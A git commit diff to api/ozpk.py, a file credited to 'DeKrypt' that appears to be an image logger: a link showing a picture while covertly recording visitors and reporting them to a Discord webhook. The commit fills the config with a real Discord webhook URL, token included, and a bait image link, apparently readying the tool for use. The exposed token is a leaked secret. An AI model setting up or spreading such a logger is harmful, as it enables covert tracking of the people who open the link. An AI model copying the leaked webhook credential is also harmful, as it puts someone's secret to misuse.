15247fd956c93f2abcca0a22282b61a47bc43239
OF5H <0987654eses@gmail.com>
2025-12-03 11:55:23 +0300

    Update ozpk.py

--- api/ozpk.py
+++ api/ozpk.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "WEBHOOK HERE !",
-    "image": "IMAGE HERE !", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1445699194894680135/mdpqj1EwNtDwTW1eaxOV6EYgnBOfjpxTbDnvGDmvlOS7MqpMISlj0dteWkWqFBT8yD6A",
+    "image": "https://i.pinimg.com/736x/21/9e/a9/219ea964f5573196d92620c3ac5a1471.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
